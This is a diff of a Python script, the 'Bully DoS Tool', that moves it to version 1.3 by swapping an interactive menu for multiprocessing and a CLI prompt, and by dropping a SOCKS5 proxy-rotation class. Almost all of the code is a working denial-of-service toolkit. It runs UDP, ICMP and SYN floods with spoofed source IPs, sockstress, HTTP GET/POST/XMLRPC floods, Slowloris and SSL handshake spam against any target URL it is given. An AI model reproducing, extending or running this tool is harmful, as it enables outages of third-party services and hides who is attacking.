@@ -1,35 +1,59 @@
-
-#---------------------------------------------------------------------------------------------------------------                          
-#                            ██████╗ ██╗   ██╗██╗     ██╗  ██╗   ██╗
-#                            ██╔══██╗██║   ██║██║     ██║  ╚██╗ ██╔╝
-#                            ██████╔╝██║   ██║██║     ██║   ╚████╔╝ 
-#                            ██╔══██╗██║   ██║██║     ██║    ╚██╔╝  
-#                            ██████╔╝╚██████╔╝███████╗███████╗██║   
-#                            ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝Bully DoS Tool by Frank Cisco   
-#                                                                Version = 1.1
-#                                                                Recommended OS = Linux 
-#---------------------------------------------------------------------------------------------------------------
-
 import socket
 import random
 import ssl
-import requests
-import sys
-import threading
-import socks 
+import sys 
 import os 
 import string
+import multiprocessing 
+import argparse
+import threading
 from fake_headers import Headers
 from urllib.parse import urlparse
 from fake_useragent import UserAgent
 from impacket import ImpactDecoder, ImpactPacket
 
-
 RED,WHITE,GREEN,END =  '\033[1;91m', '\33[1;97m','\033[1;32m', '\033[0m'
 
 class Tool : 
     
-    staticmethod
+    @staticmethod
+    def banner() :
+        print(GREEN +'''
+---------------------------------------------------------------------------------------------------------------                          
+                            ██████╗ ██╗   ██╗██╗     ██╗  ██╗   ██╗
+                            ██╔══██╗██║   ██║██║     ██║  ╚██╗ ██╔╝
+                            ██████╔╝██║   ██║██║     ██║   ╚████╔╝ 
+                            ██╔══██╗██║   ██║██║     ██║    ╚██╔╝  
+                            ██████╔╝╚██████╔╝███████╗███████╗██║   
+                            ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝Bully DoS Tool by Frank Cisco   
+                                                                Version = 1.3
+                                                                Recommended OS = Linux 
+---------------------------------------------------------------------------------------------------------------
+''' + END)
+    
+    @staticmethod 
+    def attack_banner() : 
+        
+        print(RED +''' 
+[I] Attack Started...
+                      ______
+                   .-"      "-.
+                  /            \
+                 |              |
+                 |,  .-.  .-.  ,|
+                 | )(_o/  \o_)( |
+                 |/     /\     \|
+       (@_       (_     ^^     _)
+  _     ) \_______\__|IIIIII|__/__________________________
+ (_)@8@8{}<________|-\IIIIII/-|___________________________>
+        )_/        \          /
+       (@           `--------`
+
+''' + END )
+    
+    
+    
+    @staticmethod
     def clear() : 
         
         if os.name == 'nt' :
@@ -61,110 +85,24 @@ class Tool :
         
         return Tool.ip_generator()
 
-class Proxy :    
-   
-    @staticmethod
-    def get() : 
-    
-        proxy_list = []
-        
-        try :   
-            folder_path = os.getcwd() + "" # Enter your folder path 
-            
-            files = os.listdir(folder_path)
-            
-            filename = "sock5.txt"
 
-            if  filename not in files:    
-                
-                print(RED + '==> "sock5.txt" not found trying to get file '+ END)
-                   
-                req = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all').text
-                
-                with open('sock5.txt','w',encoding='utf-8') as file :
-                    
-                    file.write(req)
-                    
-                    file.close()  
-                    
-                    print(GREEN + 'File Created ..'+END)
-                    
-            try: 
-                
-                os.chdir(folder_path)
-                
-            except :
-                
-                pass
-            
-            with open('sock5.txt','r',encoding='utf-8') as file : 
-                    
-                proxies  = file.readlines()       
 
-                for proxy in proxies : 
-                        
-                    proxy_list.append(proxy)  
-                
-            print(GREEN +'Trying to find alive proxy server...'+ END)
-        
-            while True : 
-                
-                proxy = random.choice(proxy_list)
-            
-                if Proxy.control(proxy) :
-                        
-                    print(GREEN + f'''\rOpen Sock5 Proxy Found =>
-                          \rAddress=>{proxy.split(':')[0]}
-                          \rPort=>{proxy.split(':')[1]} '''+ END)
-                
-                    return proxy
-                
-        except FileNotFoundError : 
-            
-            print(RED + f'Check the current path. Your current path is {os.getcwd()}' + END)
-
-    @staticmethod
-    def control(proxy_addr : str ) :
-    
-        print(GREEN + f'Proxy selected, starting to check...'+ END)
-        
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        s.settimeout(4)
-                
-        try : 
-            s.connect((proxy_addr.split(':')[0],int(proxy_addr.split(':')[1])))    
-            
-            s.sendall(b"\x05\x01\x00") # Trying to 'No Authentication Required' proxy.
-
-            data = s.recv(2)
-
-            s.close()
-
-            
-            return True
-
-        except socket.error:
-        
-            print(RED + 'Proxy failed, another proxy is selected' + END)
-            
-            return False
 
 class Target:
 
     @staticmethod
     def hostname() -> str :
         
-        return urlparse(sys.argv[1]).hostname 
+        return urlparse(args.target).hostname 
    
     @staticmethod
     def port() -> int : 
     
-        if urlparse(sys.argv[1]).scheme.lower() == 'https' : 
+        if urlparse(args.target).scheme.lower() == 'https' : 
             
             return 443 
         
-        elif urlparse(sys.argv[1]).scheme.lower() == 'http' :
+        elif urlparse(args.target).scheme.lower() == 'http' :
         
             return 80
         
@@ -174,24 +112,40 @@ class Target:
             sys.exit(1)
     
     @staticmethod
-    def socket_count() -> int : 
+    def ip_addr():
         
-        return 30 
+        return socket.gethostbyname(Target.hostname())
+    
     
     @staticmethod
-    def cfg() : 
+    def socket_count() -> int :
         
-        print(RED +f''' 
-            \rHost Name  => {Target.hostname()}
+        return int(args.socket_count) 
+    
+    
+    @staticmethod
+    def core_count() -> int: 
+        
+        return int(multiprocessing.cpu_count())
+    
+    
+    def attack_methods() -> str : 
+        
+        pass 
+            
+    @staticmethod
+    def info():
+            print(WHITE +f'''
+            \rTarget => {Target.hostname()}
 
-            \rIP Address => {socket.gethostbyname(Target.hostname())}
+            \rTarget IP => {Target.ip_addr()}
 
-            \rAttack Port => {Target.port()}
-             
-            \rSpoof IP =>  {Tool.spoof_ip()}
-                ''' +END)
+            \rTarget Port => {Target.port()}
 
-
+            \rConcurrent Socket => {Target.socket_count()}
+            
+            \rConcurrent Cores => {Target.core_count()}
+            '''+ END )
 
 class Payload_Generator : 
     
@@ -207,11 +161,6 @@ class Payload_Generator :
     def flood() -> str :
         
         return random._urandom(64) 
-   
-    @staticmethod
-    def customL4() -> str : 
-        
-        size = int(input(GREEN + 'Payload Size  :\n=>')+ END)
         
     @staticmethod
     def syn(spoof_ip,target,port) -> str :  
@@ -295,14 +244,14 @@ class Payload_Generator :
     
         path_chars = string.ascii_letters + string.digits + '/_-' 
         
-        path = ''.join(random.choice(path_chars) for i in range(path_length)) #
+        path = ''.join(random.choice(path_chars) for i in range(path_length)) 
     
         return '/' + path 
     
     @staticmethod
     def pps(target) -> str : 
         
-        return f'GET / HTTP/1.1\r\nHost:{urlparse(target).hostname}\r\nConnection:keep-alive\r\n\r\n'
+        return f'GET / HTTP/1.1\r\nHost:{urlparse(target).hostname}\r\n\r\n'
     
     @staticmethod
     def get(target) -> str : 
@@ -392,45 +341,41 @@ class Payload_Generator :
         Accept-Language: en-US,en;q=0.5
         Accept-Encoding: gzip, deflate
         '''
-
         return packet
 
 
-
-
-class Layer4 : 
+class Layer4(multiprocessing.Process): 
     
-    
-    def __init__(self,proxy,socket_count) :
+    def __init__(self,method) :
         
+        multiprocessing.Process.__init__(self)
+    
         self.target = Target.hostname()
         
-        self.dst_ip = socket.gethostbyname(self.target)
+        self.dst_ip = Target.ip_addr()
         
         self.port = Target.port()
         
-        self.socket_count = socket_count
-        
         self.spoof_ip = Tool.spoof_ip()
-        
+    
         self.socket_list  = []    
         
-        self.proxy = proxy 
+        self.socket_count = Target.socket_count()
+       
+        self.process_list = []
+        
+        self.process_count =  Target.core_count()
+
+        self.method = method
+         
+        self.attack_methods = {'UDP': self.udp_storm,
+                               'SYN':self.syn_flood,
+                               'ICMPF':self.icmp_flood,
+                               'ICMPB':self.icmp_flood,
+                               'SOCKSTRESS':self.sockstress} 
         
         
-        if  self.proxy : 
-                    
-            proxy_addr = Proxy.get()
-                
-            proxy_host =  proxy_addr.split(':')[0]
-                
-            proxy_port = int(proxy_addr.split(':')[1])
-                
-            socks.setdefaultproxy(socks.SOCKS5, proxy_host, proxy_port)
-            
-            socket.socket = socks.socksocket
-
-
+    
     def init_udp_socket(self) : 
         
         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 
@@ -440,34 +385,38 @@ class Layer4 :
     
     def udp_storm(self) : 
         
-        print(GREEN + '[I]UDP STROM STARTED' + END )
-        
-        _payload = Payload_Generator.udp()
-        
-        for num in range(self.socket_count):
+        try : 
+            _payload = Payload_Generator.udp()
             
-            sock = self.init_udp_socket() 
-            
-            print(GREEN +  f'Socket {num} created' + END)
-            
-            self.socket_list.append(sock)
-            
-        if self.socket_list : 
-            
-            print(RED +f'[I] Attack Started...'+END)
-            
-            while True : 
+            for _ in range(self.socket_count):
                 
-                for sock in self.socket_list:
+                sock = self.init_udp_socket() 
+
+                self.socket_list.append(sock)
+                
+            if self.socket_list : 
+                
+                while True : 
                     
-                    sock.sendto(_payload,(self.target,self.port))
-                
-        else : 
-            print(RED +' There is no open socket' + END)
-
-            return None 
+                    for sock in self.socket_list:
+                        
+                        sock.sendto(_payload,(self.target,self.port))
         
-
+        except Exception as error : 
+            
+            if isinstance(error, WindowsError) and error.winerror == 10055:
+               
+                print(RED +'Low buffer size,decrease concurrent socket count.'+ END )
+            
+                pass 
+                
+            else : 
+                
+                print(RED + str(error) + END )
+                
+                pass 
+                
+            
     def init_icmp_socket(self) :
         
         try  :
@@ -479,212 +428,172 @@ class Layer4 :
         except PermissionError : 
           
             print(RED + 'Try run as admin'+ END )
+                
     
-
-
     def icmp_flood(self) : 
         
-        select = int(input('Choose flood type Bomb or default flood => (1/2)\n1=>Bomb\n2=>Default Flood\n=>'))
-        
-        if select == 1  :
-            
-            _payload  = Payload_Generator.bomb()
-            
-        elif select == 2 :
-            
-            _payload = Payload_Generator.flood()
-            
-        else : 
-            
-            print(RED + 'WARNING 1/2 ONLY ' + END)
-            
-            raise ValueError
-                     
-        for num in range(self.socket_count):
-            
-            sock = self.init_icmp_socket() 
-            
-            print(GREEN +  f'Socket {num} created' + END)
-            
-            self.socket_list.append(sock)
-            
-        if self.socket_list : 
-            
-            print(RED +f'[I] Attack Started...'+END)
-            
-            while True : 
+        try : 
+            if self.method == 'ICMPB' : 
                 
-                for sock in self.socket_list:
+                _payload = Payload_Generator.bomb()
+            
+            elif self.method == 'ICMPF' : 
+                
+                 _payload = Payload_Generator.flood()
+            
+            for num in range(self.socket_count):
+                
+                sock = self.init_icmp_socket() 
+                
+                self.socket_list.append(sock)
+                
+            if self.socket_list : 
+                
+                while True : 
                     
-                    sock.sendto(_payload,(self.target,self.port))
+                    for sock in self.socket_list:
+                        
+                        sock.sendto(_payload,(self.target,self.port))
+        
+        except Exception as error : 
+        
+            if isinstance(error, WindowsError) and error.winerror == 10013:
                 
-        else : 
-            print(RED +' There is no open socket' + END)
-
-            return None 
-        
-        
+                print(RED +'Permission Error try run as admin' + END )
+                
+                pass
+            
+            elif isinstance(error, WindowsError) and error.winerror == 10055 : 
+                
+                print(RED +'Low buffer size,decrease concurrent socket count.'+ END )
+            
+                pass 
+                
+                
     def init_tcp_socket(self) : 
-        
+       
         sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP) 
     
         sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1) 
-            
+        
+        sock.connect((self.target,self.port))
+        
         return sock 
     
 
 
     def syn_flood(self) :  
-
-        print(GREEN + '[I] Syn flood started' + END )
         
-        _payload = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
+        try :
         
-        for num in range(self.socket_count) :
-           
-            try : 
-                
+            _payload = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
+            
+            for num in range(self.socket_count) :
+            
                 sock = self.init_tcp_socket()
-                
-                sock.connect((self.target,self.port))
-                
-                print(GREEN +  f'Socket {num} created and connected ' + END)
                 
                 self.socket_list.append(sock)
             
-            except ConnectionError : 
                 
-                print(RED +  f'Socket {num} connection failure ' + END)
+            if self.socket_list : 
+                
+                while True : 
+                    
+                    for sock in self.socket_list :
+                        
+                        sock.send(_payload)
 
-                pass
-            
-            except PermissionError : 
+        except Exception as error : 
+        
+            if isinstance(error, WindowsError) and error.winerror == 10022:
                 
-                print(RED +  f'Socket {num} failure,try run as admin ' + END)
+                print(RED +'Invalid argument supplied.You should try on Linux.' + END )
+                
+                pass
+    
+            else : 
+                
+                print(error)
 
                 pass 
-        
-            
-        if self.socket_list : 
-    
-            print(RED +f'[I] Attack Started...'+END)
-            
-            while True : 
                 
-                for sock in self.socket_list :
-                    
-                    sock.sendall(_payload)
-
     def sockstress(self) : 
-
-        print(GREEN + '[I] Sockstress started' + END )
-        
-        _payload0 = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
-        
-        _payload1 = Payload_Generator.ack(self.spoof_ip,self.dst_ip,self.port)
-        
-        for num in range(self.socket_count) :
-           
-            try : 
-                
+        try : 
+            
+            _payload0 = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
+            
+            _payload1 = Payload_Generator.ack(self.spoof_ip,self.dst_ip,self.port)
+            
+            for num in range(self.socket_count) :
+            
                 sock = self.init_tcp_socket()
                 
-                sock.connect((self.target,self.port))
-                
-                print(GREEN +  f'Socket {num} created and connected ' + END)
-                
                 self.socket_list.append(sock)
-            
-            except ConnectionError : 
+                  
+            if self.socket_list : 
                 
-                print(RED +  f'Socket {num} connection failure ' + END)
+                while True : 
+                    
+                    for sock in self.socket_list :
+                        
+                        sock.send(_payload0)
 
-                pass
-            
-            except PermissionError : 
+                        sock.send(_payload1)             
                 
-                print(RED +  f'Socket {num} failure,try run as admin ' + END)
+        except Exception as error : 
+        
+            if isinstance(error, WindowsError) and error.winerror == 10022:
+                
+                print(RED +'Invalid argument supplied.You should try on Linux.' + END )
+                
+                pass
+    
+            else : 
+                
+                print(error)
 
                 pass 
-        
-            
-        if self.socket_list : 
     
-            print(RED +f'[I] Attack Started...'+END)
-            
-            while True : 
-                
-                for sock in self.socket_list :
-                    
-                    sock.sendall(_payload0)
-
-                    sock.sendall(_payload1)
     
     def run(self) : 
-        select = int(input(WHITE +'''
-            \r------------Select Flood Type-------------
-            \r1 => UDP STORM 
-
-            \r2 => ICMP FLOOD 
-
-            \r3 => SYN FLOOD 
-
-            \r4 => Sockstress
-            \r------------------------------------------ 
-            \n==>''' + END ))
-
-        if select == 1 : 
-            
-            self.udp_storm()
         
-        elif select == 2 :
-            
-            self.icmp_flood()
-            
-        elif select == 3 :
-            
-            self.syn_flood()
-            
-        elif select == 4 : 
-            
-            self.sockstress() 
-            
-        else : 
-            
-            print(RED + '1/2/3/4 ONLY '+ END)
-            
-            raise ValueError       
+        print(GREEN+f'[I]{multiprocessing.current_process().name} started to attack...'+END)        
+        
+        self.attack_methods[self.method]()
         
         
-class Layer7 : 
+            
+class Layer7(multiprocessing.Process): 
     
-    
-    def __init__(self,proxy,socket_count) : 
+    def __init__(self,method) : 
         
+        multiprocessing.Process.__init__(self)
+    
         self.target = Target.hostname()
         
+        self.dst_ip = Target.ip_addr()
+        
         self.port = Target.port()
-        
-        self.socket_count = socket_count
-        
-        self.socket_list  = []    
-
-        self.proxy = proxy
-        
-        
-        if self.proxy  : 
-                    
-            proxy_addr = Proxy.get()
-                
-            proxy_host =  proxy_addr.split(':')[0]
-                
-            proxy_port = int(proxy_addr.split(':')[1])
-                
-            socks.setdefaultproxy(socks.SOCKS5, proxy_host, proxy_port)
-            
-            socket.socket = socks.socksocket
-        
     
+        self.socket_list  = []    
+        
+        self.socket_count = Target.socket_count()
+       
+        self.process_list = []
+        
+        self.process_count =  Target.core_count()
+
+        self.method = method
+         
+        self.methods = {'GET':Payload_Generator.get(self.target),
+                               'PPS':Payload_Generator.pps(self.target),
+                               'POST':Payload_Generator.post(self.target),
+                               'XMLRPC':Payload_Generator.XML(self.target),
+                               'SLOWLORIS':Payload_Generator.slowloris(self.target),
+                               'KILL':Payload_Generator.pps(self.target),
+                               'SSL':self.handshake_spam } 
+        
+        
     def init_tcp_socket(self) -> socket :
         
         sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
@@ -694,7 +603,7 @@ class Layer7 :
         sock.connect((self.target,self.port))  
 
         if self.port == 443 :
-                      
+                    
             context = ssl.create_default_context()
 
             context.check_hostname = False
@@ -706,7 +615,10 @@ class Layer7 :
             return sock
 
         return sock
-    
+
+        
+            
+            
     def init_ssl_socket(self) -> socket : 
         
         context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
@@ -719,157 +631,363 @@ class Layer7 :
     
         context.check_hostname = True
 
-        sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=True)
+        sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=False)
 
+        sock.settimeout(0.9)
+        
         return sock
 
                     
     def handshake_spam(self) :
-        
-        print(RED +f'[I] SSL Handshake spam preparing to attack...' + END)
-
-        loop = 1 
-    
+     
         while True : 
             
             sockets = []
             
-            print(GREEN + f'[I]Handshake spam started\nLoop => {loop}' + END)
-            
             for num in range(self.socket_count) :
                 
-                sock = self.init_ssl_socket()  
+                sock = self.init_ssl_socket()
+                
+                sock.connect((self.target, self.port))
 
                 sockets.append(sock)
-
-            print(RED + f'[I]Connections closing and sockets recreating\nLoop => {loop}' + END)
-        
+                    
+                sock.do_handshake()
+            
             for sock in self.socket_list  : 
                 
-                sock.do_handshake()
-                
+                sock.shutdown(socket.SHUT_RDWR)
+
                 sock.close()
-            
-            loop +=1 
 
-    def run(self) :
+    
+    def KILL(self) : 
         
-        select = int(input(WHITE +''' 
-                \r-----------Select Flood Type ---------
-
-                \r1 => HTTP GET 
-
-                \r2 => HTTP PPS 
-
-                \r3 => HTTP POST 
-
-                \r4 => XMLRPC   
-
-                \r5 => Slowloris     
-
-                \r6 => SSL DoS (Handshake Spam)  
-                \r--------------------------------------\n=>
-                \n==>'''+ END ))
-
-        if select == 1 : 
-           
-            _payload = Payload_Generator.get(self.target)
-
-        elif select == 2 : 
-            
-            _payload = Payload_Generator.pps(self.target)
+        thread_list = []
         
-        elif select ==  3 : 
+        for _ in range(5) : 
             
-            _payload = Payload_Generator.post(self.target)
-            
-        elif select == 4 :
-            
-            _payload = Payload_Generator.XML(self.target)
-        
-        elif select == 5  : 
-            
-            _payload = Payload_Generator.slowloris(self.target)
-        
-        elif select == 6 :
-            
-            self.handshake_spam()
+            th = threading.Thread(target=self.attack, daemon=True)
 
-            return None 
+            th.start()
+            
+            thread_list.append(th)
+            
+            
+        for th in thread_list : 
+            
+            th.join()
         
+    
+    def attack(self) : 
+        
+        try : 
+            
+            payload = self.methods[self.method]
+            
+            for num in range(self.socket_count) : 
+                
+                sock = self.init_tcp_socket()
+                
+                self.socket_list.append(sock)
+
+            if self.socket_list : 
+                
+                while True : 
+                        
+                    for sock in self.socket_list :
+                        
+                        sock.send(str.encode(payload)) 
+            
+        except Exception as error : 
+        
+            if isinstance(error, ConnectionResetError):
+            
+                print(RED +f'{multiprocessing.current_process().name} WARNING ==> Connection closed by server.'+ END)
+            
+                pass 
+            
+            elif isinstance(error,ssl.SSLEOFError)  : 
+                
+                print(RED +f'{multiprocessing.current_process().name} WARNING ==> SSL connection closed by server.'+ END)
+                
+                pass 
+            
+            else : 
+                
+                pass 
+            
+    def run(self) : 
+       
+        print(GREEN+f'[I]{multiprocessing.current_process().name} started to attack...'+END)        
+        
+        if self.method  == 'SSL' : 
+            
+            self.methods[self.method]() 
+        
+        elif self.method == 'KILL' :
+            
+            self.KILL()
+
         else : 
             
-            print(RED +'1/2/3/4 Only ' + END )
-            
-            raise ValueError 
-            
-        for num in range(self.socket_count) : 
-            
-            sock = self.init_tcp_socket()
-            
-            print(GREEN +  f'Socket {num} created and connected ' + END)
-           
-            self.socket_list.append(sock)
-        
-        if self.socket_list : 
-            
-            print(RED+ '[I] Attack Starting..... '+END)
-        
-            while True : 
-                    
-                for sock in self.socket_list :
+            self.attack()
 
-                    sock.sendall(str.encode(_payload)) 
-       
-def main() : 
-    
-    Tool.clear()
-    
-    print(RED + '[I] BUlly started ...\n'+ END)
-    
-    proxy = int(input(RED +'Connect proxy ==> 1 or 0\n===>' + END))
-    
-    socket_count = int(input(RED +'Concurrent socket count==>\n===>' + END ))
-  
-    Tool.clear()
-    
-    Target.cfg()
-    
-    if proxy != 0 : 
-        
-        print(RED + '\rProxy => True\n'+ END)
-        
-    else : 
-        print(RED + '\rProxy => False\n '+ END)
-        
-    
-    print(RED + f'Concurrent Sockets => {socket_count}'+ END )
-    
-    l4 = Layer4(proxy,socket_count)
-   
-    l7 = Layer7(proxy,socket_count)
-    
-    print(WHITE +'--------------------------------------' + END) 
-    
-    layer = int(input(WHITE+ 'Attack Layer ==>\n=>4\n=>7\n===>>>'+ END))
-    
-    if layer == 4 : 
-        
-        l4.run()
-        
-    elif layer == 7: 
-        
-        l7.run()
 
-    else : 
-        
-        print(RED + '4 or 7' + END)
-        
-        raise ValueError 
-        
 if __name__ == '__main__': 
+   
+    parser = argparse.ArgumentParser(description='Bully CLI')
+
+    parser.add_argument('-target','--target',type=str,help='Target address')
     
-    main()
-            
+    parser.add_argument('-s','--socket_count',type=int,help='Concurrent socket count')
+
+    args = parser.parse_args()  
+
+
+    def run_attack(layer,method) : 
+    
+        process_list = []
         
+        if layer == 4 : 
+            
+            Layer= Layer4
+            
+        elif layer == 7 : 
+            
+            Layer  = Layer7
+        
+        for i in range(multiprocessing.cpu_count()) : 
+            
+            _layer = Layer(method)
+
+            _layer.start()
+            
+            process_list.append(_layer)
+            
+        for _layer in process_list : 
+            
+            _layer.join()
+            
+
+    def run_prompt() : 
+        
+        Tool.clear()
+
+        Tool.banner()
+        
+        cons = GREEN +'C1sco@Bully:~$=>' + END   
+        
+        print(RED + '$=> Use help|usage.\n'+ END )
+        
+        while True : 
+            
+            cmd = input(cons + " ").strip()
+           
+            cmd = cmd.lower()
+        
+            if cmd in ['usage','help'] : 
+                
+                print(WHITE +'''
+                      \r----------------Bully DoS Tool-----------------
+                      
+                      \rFor information use => info or information 
     
+                      \rFor show attack methods use => method or methods
+                
+                      \rFor start attack interface => attack or run
+                      
+                      \rFor clear terminal use => clear 
+                      
+                      \rFor exit CLI use => exit/close/f
+                     \r------------------------------------------------
+                      ''' + END)
+
+                continue
+            
+            if cmd in ['info', 'information']: 
+                
+                Target.info()
+              
+                continue
+            
+            if cmd in['methods','method'] : 
+                
+                print(WHITE +'Layer4 Attack Methods ==>\n=>UDP Storm\n=>ICMP Flood\n=>ICMP Bomb\n=>SYN Flood\n=>Sockstress\n' + END )
+                
+                print(WHITE +'\rLayer7 Attack Methods ==>\n=>GET\n=>PPS\n=>Post\n=>XMLRPC\n=>Slowloris\n=>Kill\n=>SSL'+ END )            
+            
+                continue
+            
+            if cmd in['attack','run'] : 
+                
+                Tool.clear()
+                
+                print(RED+'---------------Attack Interface-------------'+ END)
+                    
+                print(RED+'\nChoose attack layer==>\n\n==>Layer4\n\n==>Layer7\n\nTo back to main menu use => back\n'+ END )
+                    
+                print(RED+'--------------------------------------------'+ END)
+                
+                while True : 
+                   
+                    layer  = input(cons + " ").strip()
+                    
+                    layer= layer.lower()
+                    
+                    if layer in ['1','l4','4','layer4','layer 4'] : 
+                        
+                        Tool.clear()
+                            
+                        print(RED+'---------------Layer 4----------------\n'+ END)
+                    
+                        print(RED +'Layer4 Attack Methods ==>\n\n=>UDP Storm\n\n=>ICMP Flood\n\n=>ICMP Bomb\n\n=>SYN Flood\n\n=>Sockstress\n' + END )                    
+                        
+                        print(RED + 'UDP | ICMPF | ICMPB | SYN | SOCKSTRESS' + END )
+                        
+                        print(RED + '\nFor return main menu use => back\n' + END)
+                        
+                        while True : 
+                           
+                            method = input(cons + " ").strip()
+                            
+                            method = method.upper()
+                            
+                            if method in ['UDP','ICMPF','ICMPB','SYN','SOCKSTRESS'] : 
+                                
+                                Tool.clear()
+                                
+                                print(RED + '---------------TARGET INFO-----------------'+ END)
+                                
+                                Target.info()
+                                
+                                print(RED + '--------------------------------------------'+ END)
+                                
+                                
+                                print(RED +f'Attack Layer => 4\n\nAttack Method => {method}'+ END)
+                                
+                                Tool.attack_banner()
+                                
+                                if  method == 'UDP' : 
+                                    
+                                    run_attack(4,'UDP')
+                                    
+                                elif  method == 'ICMPF' :
+                                    
+                                    run_attack(4,'ICMPF')
+                                
+                                elif  method == 'ICMPB' : 
+                                    
+                                    run_attack(4,'ICMPB')
+                                    
+                                elif  method == 'SYN' : 
+                                    
+                                    run_attack(4,'SYN')
+                                
+                                elif method == 'SOCKSTRESS' : 
+                                    
+                                    run_attack(4,'SOCKSTRESS')
+
+                            if method == 'BACK' : 
+                                
+                                Tool.clear()
+                                
+                                break
+                            
+
+                    if layer in ['2','l7','7','layer7','layer 7'] : 
+                        
+                        Tool.clear()
+                        
+                        print(RED+'-----------------Layer 7------------------\n'+ END)
+                        
+                        print(RED +'\rLayer7 Attack Methods ==>\n\n=>GET\n\n=>PPS\n\n=>POST\n\n=>XMLRPC\n\n=>Slowloris\n\n=>KILL\n\n=>SSL'+ END )   
+                                
+                        print(RED + '\nGET | PPS | POST | XMLRPC | SLOWLORIS | KILL | SSL' + END )
+                        
+                        print(RED + '\nFor return main menu use => back\n' + END)
+                       
+                        while True : 
+                        
+                            method = input(cons + " ").strip()
+                            
+                            method = method.upper()
+                            
+                            if method in ['GET','PPS','POST','XMLRPC','SLOWLORIS','KILL','SSL'] : 
+                            
+                                Tool.clear()
+                                
+                                print(RED + '---------------TARGET INFO-----------------'+ END)
+                                
+                                Target.info()
+                                
+                                print(RED + '--------------------------------------------'+ END)
+                                
+                                print(RED +f'Attack Layer => 7\n\nAttack Method => {method}'+ END)
+                                
+                                Tool.attack_banner()
+                                
+                                if  method == 'GET' : 
+                                    
+                                    run_attack(7,'GET')
+                                    
+                                elif  method == 'PPS' :
+                                    
+                                    run_attack(7,'PPS')
+                                
+                                elif  method == 'POST' : 
+                                    
+                                    run_attack(7,'POST')
+                                    
+                                elif  method == 'XMLRPC' : 
+                                    
+                                    run_attack(7,'XMLRPC')
+                                
+                                elif method == 'SLOWLORIS' : 
+                                    
+                                    run_attack(7,'SLOWLORIS')
+                                    
+                                elif method == 'KILL': 
+                                    
+                                    run_attack(7,'KILL')
+
+                                elif method == 'SSL' : 
+                                    
+                                    run_attack(7,'SSL')
+
+                            
+                            if method == 'BACK' : 
+                                
+                                Tool.clear()
+                                
+                                break 
+                    
+                  
+                    if layer == 'back' : 
+                        
+                        Tool.clear()
+
+                        break 
+                    
+                    
+                    if layer in ['exit','close','f'] : 
+                        
+                        print(RED +'Exiting...'+END)
+                        
+                        sys.exit(1)
+           
+           
+            if cmd == 'clear' :
+                
+                Tool.clear()
+
+                continue 
+            
+            
+            if cmd in ['exit','close','f'] : 
+                
+                print(RED+ 'Exiting...'+ END)
+                
+                sys.exit(1)
+    
+    run_prompt()
